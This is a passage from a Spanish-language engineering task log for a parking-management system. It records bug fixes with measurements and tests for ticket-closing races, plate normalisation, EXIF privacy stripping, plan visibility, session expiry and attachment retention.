  - El cierre por cámara: si el UPDATE no actualiza ninguna fila → se lanza `TicketAlreadyClosedError` y la ingesta devuelve **`skipped_already_inside`** (el ticket ya está cerrado y con su importe: no se vuelve a cobrar).
- **Criterios de aceptación**:
  - [x] Test del cierre manual: con la intercalación forzada, el segundo cierre recibe **409** y el ticket conserva el importe del primero.
  - [x] Test de la ingesta: con la intercalación forzada, la ingesta devuelve `skipped_already_inside` y el importe es el del primer cierre.
  - [x] Prueba inversa de los dos: reintroduciendo el `commit()` a ciegas, **los dos tests fallan**.
  - [x] El cierre normal (sin carrera) sigue funcionando: la ingesta devuelve `ticket_closed` y el manual 200.

### T-122 · P0 (negocio) — la matrícula se guardaba sin normalizar: la entrada y la salida no casaban

- **Estado**: **completado** — la matrícula se normaliza antes de buscar y de crear el vehículo
- **Contexto**: la ingesta usaba el **texto crudo** del OCR (`hit.plate`) para buscar y crear el vehículo, mientras que el filtro de «esto es una matrícula» (`parece_matricula`) **sí** normalizaba. El helper `normalizar_matricula` ya existía y el alta manual lo usaba desde el principio: lo que faltaba era usarlo en la ingesta.
- **Medido** (2026-10-23, con la intercalación de una cámara de entrada y otra de salida):
  - entrada con `"1111abc"` y salida con `"1111ABC"` → **dos vehículos distintos**;
  - la salida no encontraba el ticket activo → `skipped_no_active_ticket` → **no se cobraba**;
  - el ticket de la entrada se quedaba **activo para siempre**: plaza ocupada, coche que no puede volver a entrar, y y el parking se queda sin ese ingreso.
- **El arreglo**: `matricula = normalizar_matricula(hit.plate)` antes del lookup y del INSERT. Es el **cambio mínimo** que arregla el bug: el `IngestResult.plate` sigue siendo el texto que leyó el OCR (es la evidencia), pero la **identidad** del vehículo es la forma canónica.
- **Nota**: los vehículos ya guardados con espacios (posibles sólo en una BD de desarrollo anterior a este cambio) no se re-normalizan; en producción la tabla está vacía al empezar.
- **Criterios de aceptación**:
  - [x] Test: entrada en minúsculas y salida en mayúsculas (con espacio) → **el mismo ticket**, cerrado y cobrado; y **un solo vehículo** en la BD.
  - [x] El vehículo se guarda normalizado (`1111ABC`).
  - [x] Prueba inversa: con la matrícula cruda, el test **falla**.
  - [x] Los 19 tests de la ingesta pasan.

### T-123 · P2 (operación) — un error interno se anunciaba como «no hay geocerca»

- **Estado**: **completado** — cada error dice lo que es
- **Contexto**: el `catch-all` global de la ingesta traducía **cualquier** error inesperado a `skipped_no_geofence` («no hay geocerca calibrada»), con el motivo real sólo en el log. Y la carrera por la **plaza** (otro vehículo la ocupa entre la comprobación y el INSERT) caía en ese mismo `catch-all`: la base de datos ya lo prohibe (índice único parcial) y el estado correcto (`skipped_space_occupied`) ya existía.
- **Medido** (2026-10-23):
  - un error inesperado → `skipped_no_geofence` con el motivo «error interno: …» (**explicación falsa**);
  - la carrera por la plaza → `skipped_error` / «error interno: (sqlite3.IntegrityError…)» (**se pierde la causa**).
- **El arreglo**:
  1. Estado nuevo `SKIPPED_ERROR` para los fallos inesperados (el `catch-all` deja de disfrazarse de geocerca).
  2. La carrera por la plaza se comprueba y se devuelve como `SKIPPED_SPACE_OCCUPIED` («la plaza ya la ocupa otro vehículo»), que es lo que ocurrió.
- **Criterios de aceptación**:
  - [x] Test: un error inesperado → `skipped_error`, y su motivo **no** habla de geocercas.
  - [x] La carrera por la plaza se distingue y se reporta como `skipped_space_occupied`. **No se automatiza**: en PostgreSQL la carrera real **bloquea** (la sesión de la ingesta tiene ya el lock del índice único de la plaza, y la otra sesión se queda esperando), así que simularla cuelga la suite. El camino de la plaza ya ocupada sí está cubierto por `test_skips_when_space_already_occupied`.
  - [x] Pruebas inversas de los dos: reintroduciendo el comportamiento anterior, los tests **fallan**.

### T-124 · P1 (decisión de producto) — una entrada sin salida deja el ticket activo para siempre

- **Estado**: **completado** — decisión tomada (2026-10-24, del usuario) e implementada: auto-cierre a las 24 h con el importe estimado y aviso al cliente
- **La decisión** (2026-10-24, del usuario): **auto-cierre a las 24 h**, con el **importe estimado** (la tarifa vigente, calculada como si la salida fuese a las 24 h de la entrada) y **aviso al cliente por correo**. No es una alerta: el ticket se cierra solo.
- **Contexto**: no había **ningún** mecanismo que reconcilie una entrada cuya salida nunca se vio: ni auto-cierre, ni purga de tickets, ni alerta. El beat (`app/workers/celery_app.py`) sólo tiene tick, probe de cámaras y purgas de adjuntos, auditoría y frames fallidos: ninguna de tickets.
- **Medido** (2026-10-23, sobre el código y con la suite): una entrada sin salida deja el ticket `ACTIVO` **para siempre**, y de ahí salen cuatro consecuencias:
  1. el KPI de espacios muestra `occupied=1` para siempre (la plaza consta ocupada);
  2. el vehículo no puede volver a entrar: la ingesta responde `skipped_already_inside` (T-105);
  3. **el ingreso no se factura**: el importe se escribe sólo al cerrar (`ingest_service.py`), así que mientras el ticket está activo `amount`/`total` son NULL y los ingresos (que suman tickets **cerrados**) no lo cuentan;
  4. si se cierra a mano 30 días después, `max_daily` se aplica **por estancia** (con la tarifa del seed, 25 €/día → 750 €; y `max_daily` es **opcional**: la UI ofrece «Sin tope», así que sin tope serían 30 días lineales).
- **Por qué no se arregla aquí**: el «qué hacemos con un coche que no sale» es **política de producto**, no un bug: auto-cierre a las 24 h con el importe de esa estancia, con aviso al operador, o sin auto-cierre pero con alerta. Cada opción cambia lo que se cobra y hay que elegirla (y y hay que decidir si el cliente final recibe un aviso).
- **Lo que sí se puede hacer sin decidir nada**: **avisar**. Una alerta cuando un ticket lleva activo más de X horas es informacional (no cobra nada) y deja al operador decidir. Está pendiente de la decisión del umbral.
- **El arreglo** (2026-10-24):
  1. servicio nuevo `app/services/ticket_auto_close.py` (`auto_cerrar_tickets_sin_salida`): cierra los tickets `ACTIVO` sin salida cuya entrada es de hace más de 24 h, con el importe de `calculate_ticket_total` (la **misma** tarifa que el cierre manual) y con `cerrar_ticket` (la **única** implementación de cierre del repo, que es condicional: si la cámara se adelanta, el auto-cierre no pisa nada);
  2. **sin tarifa no se inventa un precio**: el ticket se deja abierto y se cuenta en `omitidos` (cerrarlo a 0 sería inventarse un precio);
  3. aviso al cliente por correo (`app/services/templates/ticket/auto_closed.{txt,html}.j2`), encolado como tarea para que el SMTP no esté en el hilo del cierre;
  4. tarea `solidapp.auto_close_tickets` en el beat (cada hora, al minuto 10) y `solidapp.enviar_correo_cierre_automatico`.
- **Medido** (2026-10-24, contra el stack de QA, con la tarea despachada por el broker de verdad): el ticket activo sin salida (id 3, entrada del 2026-06-30) se cerró con salida = entrada + 24 h y el importe de la tarifa vigente:
  ```
  RESULTADO: {'cerrados': 1, 'omitidos': 0, 'importe': 25.0, 'horas': 24, 'avisos': []}
  # el ticket, despues:
  id 3 | status cerrado | salida 2026-07-01 21:36:35.355885+00:00 | importe 25.0 | descuento 0.0 | total 25.0
  ```
  (`avisos: []` porque ese vehículo no tiene propietario con correo: se avisa en el log y no se manda nada.)
- **Lo que NO hace** (para que no se entienda mal): no **cobra** (el cobro sigue siendo el que defina el producto: hoy es contable, D2), no **penaliza** por exceso de tiempo (el importe es el de la estancia) y no toca los tickets con salida detectada.
- **Criterios de aceptación**:
  - [x] Decisión de producto: **auto-cierre a las 24 h** (2026-10-24, del usuario).
  - [x] Con qué importe: el de la **tarifa vigente** en el momento de la entrada, y **sin tarifa no se cierra** (se omite y se avisa).
  - [x] Con qué aviso al cliente: **correo** con la matricula, la sucursal, las horas y el importe; encolado como tarea.
  - [x] Test: un ticket de 25 h se cierra con salida = entrada + 24 h y el importe de la tarifa; uno de 2 h no se toca; sin tarifa se queda abierto; el aviso lleva el correo del propietario; un ticket ya cerrado no se pisa.
  - [x] Prueba inversa en `tools/verificar_pruebas_inversas.py`.

### T-125 · P2 (operación) — los vehículos «fantasma» se acumulan sin purga

- **Estado**: **completado** — una tarea diaria en el beat los borra
- **Contexto**: la ingesta crea el vehículo de una matrícula desconocida **antes** de saber si va a haber ticket: si después la plaza está ocupada, o averiada, o la cámara no tiene geocerca calibrada, el intento se queda a medias y el vehículo se queda **sin dueño y sin ticket**. Y no había ninguna tarea que los borrara: el beat sólo purga adjuntos de incidentes, auditoría y frames fallidos.
- **Medido** (2026-10-23, en la base de datos de QA): **3 vehículos con cero dueños y cero tickets**, creados el **2026-06-30** (casi cuatro meses antes) y sin ninguna purga que los tocara. Las únicas tareas de purga eran `purge_incident_attachments` y `purge_audit_logs`.
- **El arreglo**: servicio nuevo `app/services/vehicle_purge.py` + tarea `solidapp.purge_ghost_vehicles` en el beat (4:23 AM, hora valle). El criterio son **tres** condiciones, todas necesarias:
  1. **sin dueño** (`vehicle_users` vacío): protege a los coches que los clientes dan de alta en la app;
  2. **sin tickets** (ni activos ni cerrados): un vehículo que ha entrado alguna vez no se toca;
  3. **antiguo** (24 h por defecto): el coche puede haber entrado ahora mismo y su ticket escribirse después.
- **Medido al arreglarlo** (2026-10-23, tarea despachada por el broker de verdad): `{'deleted': 3, 'max_age_hours': 24}` → los 3 fantasmas borrados y los 3 vehículos con tickets **intactos**.
- **OJO (efecto secundario documentado)**: la purga borra también los vehículos **de ejemplo** del seed (`1111DIR`, `2222NEW`, `9999DIR`): son filas sin uso igual que los fantasmas. El flujo de «dar de alta un coche desconocido» no se rompe, porque el alta manual crea el vehículo.
- **Criterios de aceptación**:
  - [x] Test: un vehículo sin dueño, sin tickets y viejo → **se borra**.
  - [x] Test: un vehículo **con dueño** → se queda (no se toca el coche de un cliente).
  - [x] Test: un vehículo **con ticket** → se queda.
  - [x] Test: un vehículo **reciente** → se queda (el coche puede haber entrado ahora).
  - [x] Test: la purga es **idempotente** (la segunda pasada borra 0).
  - [x] Prueba inversa de las tres condiciones: debilitando cualquiera de ellas, el test correspondiente **falla**.
  - [x] Tarea registrada en el worker y despachada por el broker: `deleted=3` en la BD de QA.
  - [x] La puerta `verificar_tareas_celery.py` la da por viva (está en el `beat_schedule`).

### T-126 · P2 (operación) — el cierre manual no publicaba nada en el bus de eventos

- **Estado**: **completado** — el cierre manual publica `ticket_closed` como los demás
- **Contexto**: el cierre por cámara y el alta manual publican en el bus SSE (para que el mapa del gestor se actualice al instante). El cierre **manual** (`POST /tickets/{id}/close`) no publicaba nada: la app se enteraba hasta el poll de 30 s.
- **Medido** (2026-10-23, con un Redis falso): al cerrar un ticket a mano, el canal `parking:{id}:events` **no recibía nada**.
- **El arreglo**: el cierre manual publica `TICKET_CLOSED` con el `ticket_id` y el `total`, igual que los otros dos caminos.
- **Criterios de aceptación**:
  - [x] Test: al cerrar un ticket, el bus recibe un evento `ticket_closed` en el canal de la sucursal, con el `ticket_id` y el `total`.
  - [x] Prueba inversa: quitando el `publish_event`, el test **falla**.

### T-127 · P1 (operación) — un error de integridad que no era de la matrícula se comía la causa

- **Estado**: **completado** — el error de verdad se propaga
- **Contexto**: el `try/except IntegrityError` que rodea el **flush del vehículo** (al crear el vehículo de una matrícula nueva) capturaba **cualquier** error de integridad, no sólo el de la matrícula duplicada. Consecuencias, medidas al correr la suite contra PostgreSQL:
  1. hacía `rollback()` (que **borra el vehículo que la ingesta acababa de crear**);
  2. y luego hacía `.one()` sobre un vehículo que ya no existía → **`NoResultFound`**, un error que no explica nada;
  3. la causa original (por ejemplo, el `IntegrityError` de la FK o del índice de la plaza) quedaba **enterrada**, y el operador recibía un `skipped_error` sin más detalle.
- **Medido** (2026-10-23, la suite contra PostgreSQL):
  ```
  sqlalchemy.exc.IntegrityError: insert or update on table "tickets"
      violates foreign key constraint "tickets_vehicle_id_fkey"
  ...
  During handling of the above exception, another exception occurred:
  sqlalchemy.exc.NoResultFound: No row was found when one was required
    (ingest_service.py:263, el `.one()` del vehículo)
  ```
- **El arreglo**: tras el rollback, el vehículo se busca con `.one_or_none()`; si **no** está (porque el rollback se lo llevó, y el error no era de la matrícula) se **propaga el `IntegrityError` original**, que es lo que corresponde. Antes se inventaba un `NoResultFound` sin relación.
- **Criterios de aceptación**:
  - [x] Test (en SQLite **y** en PostgreSQL): un `IntegrityError` que no es de la matrícula se propaga con su mensaje original, y no se anuncia como un `NoResultFound`.
  - [x] El caso normal (matrícula duplicada) sigue funcionando: se re-fetchera el vehículo del otro proceso.
  - [x] La suite de ingesta pasa en los dos dialectos (19 tests).

### T-129 · P1 (privacidad) — las fotos de incidentes se guardaban con la GPS y el modelo de cámara

- **Estado**: **completado** — el original se guarda sin metadatos (mismos píxeles)
- **Contexto**: la miniatura de los adjuntos ya se re-codificaba (y por eso no tenía EXIF), pero el **original se guardaba byte a byte** y se servía tal cual. Una foto de móvil lleva en el EXIF la **GPS** de donde se hizo, el modelo de cámara y la hora.
- **Medido** (2026-10-23, auditoría de la API de incidencias): los bytes servidos en `GET /incidents/attachments/{id}/download` eran **idénticos** a los subidos, y por tanto **con su EXIF**. La retención de 90 días (T-95) no lo neutraliza: el EXIF viaja en cada descarga.
- **Por qué importa**: la ubicación de donde se hizo una foto es dato personal (LOPDGDD) y el sistema **no lo necesita** para nada: es metadato del dispositivo de quien fotografía.
- **El arreglo**: `sanear_metadatos()` re-codifica la imagen sin metadatos conservando los **píxeles** y la **orientación** (que va en el EXIF: si se quita sin aplicar la rotación, la foto sale girada → `ImageOps.exif_transpose`). El hash y el tamaño pasan a ser los del contenido **guardado**, no los del recibido (si no, dos subidas del mismo fichero darían hashes distintos y la deduplicación del volumen no serviría).
- **Criterios de aceptación**:
  - [x] Test: una foto con GPS en el EXIF se descarga **sin** la GPS.
  - [x] Test: la imagen conservada tiene las mismas dimensiones.
  - [x] Test: la miniatura tampoco lleva EXIF (afirmación que hasta ahora no tenía test).
  - [x] Test: la **orientación** se conserva (una foto con `Orientation=6` sale recta, no girada).
  - [x] Prueba inversa: volviendo a guardar el contenido tal cual, el test del GPS **falla**.
  - [x] Un fichero corrupto sigue siendo un **400** (no un 500).

### T-130 · P1 (negocio) — los tres caminos de cierre duplicaban el patrón «comprueba al leer y commitea a ciegas»

- **Estado**: **completado** — un solo helper, condicional, para los tres caminos
- **Contexto**: el T-121 arregló el cierre **por cámara**, pero el cierre **manual del servicio** (`app/services/manual_tickets.py`) y el del **endpoint** tenían cada uno su propia copia del patrón. Y había **tres** sitios donde arreglarlo y tres donde se podía volver a romper.
- **Medido** (2026-10-23, auditoría del cobro de planes): con un cierre a la vez (la cámara de salida y el operador), la salida manual **escribía su importe encima** del del otro cierre → el importe dependía del orden de commit.
- **El arreglo**: `app/services/ticket_closing.py` — **una sola implementación** (`cerrar_ticket`) con el UPDATE condicional (`WHERE id = ... AND status = 'activo'`), usada por los tres caminos. La excepción `TicketAlreadyClosedError` también es una sola definición.
- **Criterios de aceptación**:
  - [x] Test: la salida manual, con la intercalación forzada, recibe **409** y el ticket conserva el importe del primer cierre.
  - [x] Prueba inversa: volviendo al `commit()` a ciegas, el test **falla**.
  - [x] Los tres caminos usan el helper (no queda ninguna copia del patrón).

### T-131 · P2 (contabilidad) — el importe del ticket no cuadraba: 2,67 − 1,34 ≠ 1,34

- **Estado**: **completado** — se redondea una sola vez y en orden
- **Contexto**: `calculate_ticket_total` (`app/services/pricing.py`) calculaba el total con los valores **sin redondear** y después redondeaba `amount` y `discount` por separado. El resultado no cuadraba.
- **Medido** (2026-10-23, con una tarifa de 2,50 €/hora + 0,175 € por fracción de 15 min y un plan del 50 %):

  | | importe | descuento | total |
  |---|---|---|---|
  | antes | 2,67 € | 1,34 € | **1,34 €** (2,67 − 1,34 = 1,33) |
  | ahora | 2,67 € | 1,33 € | **1,33 €** ✓ |

  Es decir, el PDF del ticket enseñaba una cuenta que no sumaba.
- **El arreglo**: se redondea **una sola vez y en este orden**: el importe, luego el descuento (calculado sobre el importe ya redondeado) y por último el total, que es la diferencia de los dos valores redondeados. Así la propiedad «importe − descuento = total» se cumple siempre.
- **Criterios de aceptación**:
  - [x] Test: el caso que descuadraba → importe 2,67, descuento 1,33, total 1,33 ✓.
  - [x] Test: la propiedad se cumple en 10 estancias distintas (de 5 min a 10 h).
  - [x] Prueba inversa: volviendo al orden viejo, el test **falla**.

### T-132 · P2 (contrato) — un cliente podía ver los planes desactivados

- **Estado**: **completado** — el cliente sólo ve los planes que puede comprar
- **Contexto**: un plan desactivado no se puede suscribir (`POST /plans/subscriptions` lo rechaza con 409), así que el cliente no debería verlo. Pero `GET /plans` respects el parámetro `only_active` tal cual ⇒ bastaba con pasar `?only_active=false` para ver los planes retirados, y `GET /plans/{id}` no filtraba nada.
- **Medido** (2026-10-23): un cliente con `?only_active=false` recibía el plan desactivado en el catálogo, y `GET /plans/{id}` de un plan desactivado devolvía 200 con su ficha completa (precio, descuento, vehicles incluidos).
- **El arreglo**: para el admin, `only_active` funciona como antes (por omisión ve todos). Para el resto de roles, **siempre** se filtran los desactivados. Y el detalle de un plan desactivado es un **404** para el cliente (el admin lo sigue viendo, para poder reactivarlo).
- **Criterios de aceptación**:
  - [x] Test: el catálogo del cliente sólo tiene los activos.
  - [x] Test: `?only_active=false` no le enseña al cliente los desactivados.
  - [x] Test: el detalle de un plan desactivado es un 404 para el cliente.
  - [x] Test: el admin los sigue viendo (catálogo y detalle).
  - [x] Prueba inversa: dejando el parámetro invertible, el test **falla**.

### T-133 · P1 (contabilidad) — se podían crear dos suscripciones **solapadas**

- **Estado**: **completado** — la guarda mira el solape de periodos
- **Contexto**: la regla de negocio («un usuario tiene como mucho una suscripción vigente») estaba escrita en el propio endpoint, pero la guarda miraba la suscripción que estaba en periodo **en ese instante**. Una suscripción que empieza antes de que caduque la otra (o que empieza en el futuro y se solapa cuando llegue) pasaba el filtro.
- **Medido** (2026-10-23): con dos suscripciones solapadas, el descuento que se aplica es el **mayor** de los dos, y `GET /plans/me` sólo enseña **una**: la otra se queda en la contabilidad sin que nadie la vea (y su importe contable no aparece en ninguna parte).
- **El arreglo**: la guarda comprueba el **solape de periodos** (`starts_at < ends_at` y `ends_at > starts_at`) con cualquier suscripción activa del usuario. La renovación justa (empieza justo cuando caduca la otra) sigue valiendo.
- **Residual documentado**: dos altas simultáneas (dos admins a la vez) todavía pueden colarse: no hay índice que impida el solape, porque el producto permite renovar antes de que caduque. Es la misma categoría que el T-121 (lo que no se puede saltar con una carrera es la base de datos) y el impacto es acotado (un descuento doble, no un cobro indebido).
- **Criterios de aceptación**:
  - [x] Test: una suscripción que se solapa con la vigente → **409**.
  - [x] Test: una suscripción futura que se solapa → **409**.
  - [x] Test: la renovación justa (empieza al caducar la otra) → **201**.
  - [x] Prueba inversa: volviendo a la guarda anterior, el test **falla**.

### T-134 · P2 (privacidad) — un adjunto caducado seguía teniendo metadata legible

- **Estado**: **completado** — lo que no se puede descargar tampoco se lista
- **Contexto**: el T-95 hizo que los **bytes** de un adjunto caducado dieran un 410, pero su **metadata** (nombre del fichero, tamaño, ruta en el volumen) se seguía sirviendo, y el listado de adjuntos de un incidente los seguía enseñando.
- **Medido** (2026-10-23): con el `expires_at` vencido, `GET /incidents/attachments/{id}` devolvía 200 con la ficha, y el listado los incluía.
- **El arreglo**: la metadata de un adjunto caducado es un **410** (igual que los bytes) y el listado **no** enseña los caducados.
- **Criterios de aceptación**:
  - [x] Test: la metadata de un adjunto caducado → 410.
  - [x] Test: el listado no lo enseña.
  - [x] El `DELETE` sigue pudiendo borrar un adjunto caducado (para limpiarlo).

### T-135 · P1 (puerta) — las pruebas inversas vivían en una carpeta temporal: nadie las ejecutaba

- **Estado**: **completado** — la puerta está en el repo y en el CI
- **Contexto**: cada arreglo de esta tanda se comprobó con una **prueba inversa** (volver a poner el defecto y ver que el test **falla**). Es la única forma de saber que un test sigue detectando. Pero esas pruebas vivían en la carpeta temporal de quien las escribió: nadie las ejecutaba, así que un test reescrito, un refactor o un mensaje cambiado podían dejar de detectar **sin que el repo se pusiera rojo**.
- **Lo que hace la puerta** (`tools/verificar_pruebas_inversas.py`): para cada uno de los **11** arreglos de la tanda, copia el fichero, vuelve a poner el defecto, ejecuta el test y comprueba que **falla** — y que falla por una **aserción**, no por un error de código (un `NameError` en el defecto probaría que el test se rompe, no que detecta). Después restaura el fichero.
- **Medido** (2026-10-23): las 11 pruebas inversas siguen detectando su defecto ✓.
- **La autoprueba de la puerta**: monta un caso de mentira (un «defecto» que no rompe nada, con un test que sigue pasando) y comprueba que la puerta lo detecta.
- **OJO, y es importante** (2026-10-23): la primera versión de la puerta modificaba el fichero **en su sitio** (para que el módulo que se importa fuera el defectuoso). Se discovered al **lanzar el CI en paralelo**: el job leía el código con el defecto puesto y el árbol de trabajo quedaba sucio. Ahora la puerta trabaja sobre una **copia** del backend en un directorio temporal: **no toca el repositorio en absoluto**, y se puede ejecutar sin miedo junto a otras cosas.
- **Criterios de aceptación**:
  - [x] Los 11 casos (T-113, T-114, T-115, T-120, T-121, T-125, T-129, T-131, T-132, T-133, T-134) se comprueban con el defecto puesto y el test **falla**.
  - [x] Un fallo por error de código **no** cuenta como detección (la puerta lo marca como inválido).
  - [x] La autoprueba detecta un caso que no detecta nada.
  - [x] Registrada en `tools/autopruebas.py` (meta-puerta), en `tools/verificar_repo.py` y en el workflow del CI.

### T-137 · P2 (refutado por medición) — «la sesión caducada no expulsa de la vista»: **la refutación estaba equivocada**

- **Estado**: **corregido por el T-140** — el defecto **sí existía**; aquí queda escrito por qué se dio por inexistente
- **Lo que decía la sospecha**: el backend avisa de que la sesión está muerta con el evento `solidapp:sesion-caducada` (T-110) y el store limpia el usuario, pero el guard del router **sólo corre al navegar**: el operador se quedaría en la pantalla con los datos ya descargados y cada petición posterior daría 401 sin mensaje.
- **Medido** (2026-10-24, con un navegador de verdad): se inicia sesión como gestor, se abre el mapa, se mata la sesión desde el navegador (`POST /auth/logout` con el refresh actual ⇒ el backend lo blacklistea) y se pulsa «Refrescar» (una petición de la app, **sin navegar**):
  ```
  1) tras el login:      http://localhost:5173/mapa
  2) en el mapa:         http://localhost:5173/mapa
  3) sesion matada: True | URL: http://localhost:5173/mapa
  4) tras pulsar Refrescar: http://localhost:5173/login?redirect=/mapa
     navegaciones: ['/mapa', '/login?redirect=/mapa']
     tokens: {'access': False, 'refresh': False}
  ```
- **Por qué la refutación estaba equivocada**: ese resultado se obtuvo **con un cambio en el router que vivía en el árbol de trabajo, sin commitear**. La comprobación de que «el resultado es el mismo quitando cualquier listener propio» quitó el listener del **store** (no el del router), así que la conclusión «ya hay otro camino que expulsa» era falsa. Al revertir el cambio del router para hacer el commit, **nadie volvió a ejecutar la QA**: la puerta quedó en rojo sin que nadie lo notara. Lo soltó el T-140, al ejecutarla en serio.
- **Lo que sí queda de este trabajo**:
  1. la **prueba de regresión** (`frontend/scripts/qa_sesion_caducada.py`, con navegador de verdad) queda como puerta, y es justo la que atrapó el fallo;
  2. su **prueba inversa** (`frontend/scripts/qa_sesion_caducada_inversa.py`);
  3. una **puerta estática** (`tools/verificar_sesion_caducada.py`) que sí puede correr en el CI (sin navegador), con el caso de mentira del comentario;
  4. escrito que la comprobación «el guard sólo corre al navegar» era **cierta**: era el diagnóstico correcto, y lo que falló fue la medición.
- **Criterios de aceptación**:
  - [x] Medido: la sesión caducada expulsa al login y borra los tokens (con y sin listener propio).
  - [x] QA nueva (`frontend/scripts/qa_sesion_caducada.py`) registrada en `verificar_repo.py` como puerta de regresión.
  - [x] **No** se añade código para un defecto que no existe: aquí el defecto **sí** existía, y se arregla en el T-140.

### T-138 · P2 (frontend) — un gestor sin sucursales se quedaba en «Cargando…» para siempre

- **Estado**: **completado** — la pantalla explica que no hay ninguna sucursal asignada
- **Contexto**: en `MovementsView` («Entradas / Salidas») y `AlertsView` («Alertas») la carga tiene un `return` temprano cuando no hay sucursal seleccionada, y ese `return` **no bajaba el flag `loading`**. Un gestor sin membresías (o al que la carga de sucursales le falla) se quedaba mirando **«Cargando…» para siempre**, sin ninguna pista de que faltara una sucursal.
- **Medido** (2026-10-24, con un navegador de verdad y un gestor **sin membresías** creado al vuelo):
  ```
  FALLO:
    - movimientos: sigue en «Cargando…»
    - alertas: sigue en «Cargando…»
  ```
  Y el mensaje que se veía **con** el arreglo: «No tienes ninguna sucursal asignada».
- **El arreglo** (dos cosas):
  1. el `return` temprano baja `loading` y deja un error claro («No tienes ninguna sucursal asignada»);
  2. el mensaje «No hay movimientos que cumplan los filtros» / «No hay alertas con estos filtros» **se oculta si hubo error**: antes la app afirmaba que no había datos cuando lo que había pasado es que la petición falló (el mismo patrón que el T-111 corrigió en `LiveView`).
- **Criterios de aceptación**:
  - [x] QA nueva (`frontend/scripts/qa_gestor_sin_sucursal.py`) con un navegador de verdad: crea un gestor sin membresías, entra con él y comprueba que la pantalla **no** queda en «Cargando…», que explica que no hay sucursal y que **no** afirma que no hay datos.
  - [x] El usuario de prueba se borra al terminar (la QA no deja basura).
  - [x] Prueba inversa (`qa_gestor_sin_sucursal_inversa.py`): sin el arreglo la QA falla por el motivo correcto.
  - [x] La QA queda registrada en `tools/verificar_repo.py`.

### T-139 · P2 (frontend) — un login que no puede cargar el perfil decía «Bienvenido» y no decía nada

- **Estado**: **completado** — el login falla con un mensaje y no deja tokens
- **Contexto**: `fetchMe()` (`frontend/src/stores/auth.ts`) se tragaba **cualquier** error con un `catch` vacío, y su comentario describía un comportamiento que **no existía** («el guard del router acepta esto»): el guard comprueba `isAuthenticated`, que es `user !== null`; sin perfil, echaba al usuario al login.
- **Medido** (2026-10-24, con un navegador de verdad e interceptando `/users/me` para que devuelva un 500):
  ```
  # con el defecto:
  FALLO: el login fallo sin mostrar ningun error
         (la pagina dice: 'Gestión de parkings / Iniciar sesión / ...')
  # con el arreglo:
  OK: el login fallo con mensaje ('fallo de prueba') y sin tokens
  ```
  Es decir: un fallo del **servidor** (no unas credenciales malas) se disfrazaba de login correcto: toast de «Bienvenido», token guardado, perfil vacío y vuelta al formulario sin explicación.
- **El arreglo**:
  1. `fetchMe()` **propaga** el error (el comentario anterior describía una mentira);
  2. `login()` limpia los tokens si el perfil no se pudo cargar (si no, queda un token sin usuario) y deja que el error suba al login, que lo muestra;
  3. `restore()` limpia la sesión si no se puede restaurar, sin romper el arranque.
- **Criterios de aceptación**:
  - [x] QA nueva (`frontend/scripts/qa_login_error.py`): con `/users/me` en 500, el login **falla con un mensaje** y **no deja tokens**.
  - [x] Prueba inversa (`qa_login_error_inversa.py`): sin el arreglo la QA falla por el motivo correcto.
  - [x] La QA queda registrada en `tools/verificar_repo.py`.

### T-140 · P1 (sesión) — la sesión caducada NO expulsaba al login (y el T-137 se había refutado mal)

- **Estado**: **completado** — la sesión caducada expulsa al login y borra los tokens
- **Contexto**: el T-137 dio este defecto por **refutado** («la app sí expulsa al login») y **revirtió el cambio del router**. La verdad es que el defecto existía: el backend avisa con el evento `solidapp:sesion-caducada` (T-110), el store limpia el usuario, pero **el guard del router sólo corre al navegar**. Sin una redirección explícita, el operador se queda en la pantalla con los datos ya descargados y cada petición posterior da 401 sin mensaje.
- **Por qué se refutó mal** (la lección): el arreglo estaba en el **router**, y la medición «quitando cualquier listener propio» quitó el listener del **store**: el resultado era el mismo y se concluyó que «ya hay otro camino que expulsa». Al revertir el cambio del router para hacer el commit, **nadie volvió a ejecutar la QA** ⇒ la puerta quedó en rojo sin que nadie lo notara.
- **Medido** (2026-10-24, con un navegador de verdad y una sonda que captura red, consola y estado):
  ```
  1) login OK, URL: http://localhost:5173/mapa
  2) sesión matada: logout HTTP 200
  3) tras pulsar Refrescar: 401 en /parkings/{id}/spaces y en /tickets; el refresh responde 422
  4) tokens: access=False, refresh=False, email=None      (los tokens SÍ se limpian)
  5) evento 'sesion-caducada' disparado: SÍ
  6) URL final: http://localhost:5173/mapa                   <-- NO expulsó
  7) la pantalla seguía mostrando las plazas, con el rótulo «Sin sesión»
  ```
- **El arreglo**: en `frontend/src/router/index.ts`, el router registra un listener de `solidapp:sesion-caducada` que **navega al login** (`router.replace({ name: 'login', query: { redirect: ... } })`): el guard expulsa al operador y la pantalla muerta desaparece. Con el arreglo la URL pasa a `http://localhost:5173/login?redirect=/mapa`.
- **Criterios de aceptación**:
  - [x] Medido: la sesión caducada expulsa al login (URL `login?redirect=/mapa`) y borra los tokens.
  - [x] Prueba inversa (`frontend/scripts/qa_sesion_caducada_inversa.py`): sin la redirección, la QA falla por el motivo correcto.
  - [x] Puerta nueva (`tools/verificar_sesion_caducada.py`) con autoprueba de **5 casos de mentira** (uno de ellos: el listener sólo se menciona en un comentario), registrada en `tools/autopruebas.py`, en `tools/verificar_repo.py` y en el workflow del CI.
  - [x] La puerta vigila el código **sin comentarios**: un comentario que menciona `router.replace({ name: 'login' })` no cuenta.
### T-141 · P1 (privacidad) — la retención de las fotos no se cumplía: el worker no veía el volumen

- **Estado**: **completado** — la retención se cumple y el sistema avisa si no puede cumplirla
- **Contexto**: las fotos de los incidentes **no** van en la base de datos: van en un volumen Docker (`incident_attachments`), y en la BD sólo queda la metadata (T-21). La purga de retención (90 días, LOPDGDD) la ejecuta el **worker** (`solidapp.purge_incident_attachments`, a las 3:17 AM): borra las filas y los ficheros.
- **El defecto**: el `backend` montaba el volumen **con nombre** (`incident_attachments`), pero el `celery-worker` y el `celery-beat` **no montaban ninguno**. Como el `Dockerfile` declara `VOLUME ["/var/lib/solidapp/incident-attachments"]`, Docker les creaba un volumen **anónimo** distinto a cada uno:
  ```
  backend       -> volume  parking_incident_attachments   (el bueno)
  celery-worker -> volume  7c3e663747fa29f6... (anónimo)
  celery-beat   -> volume  2c92d21ec76c5021... (anónimo)
  ```
- **Medido** (2026-10-24, contra el sistema en marcha): con la purga ejecutada **dentro del contenedor del worker** (que es donde la lanza el beat) y las 4 filas caducadas:
  ```
  # en el worker (con su volumen anónimo):
  RESULTADO DE LA PURGA: {'deleted': 4}          <-- éxito aparente
  # en el volumen del backend, DESPUÉS de purgar:
  originales/56/56ec35a3...jpg                   <-- el fichero sigue ahí
  originales/64/64078f24a...jpg
  miniaturas/56/56ec35a3..._thumb.jpg
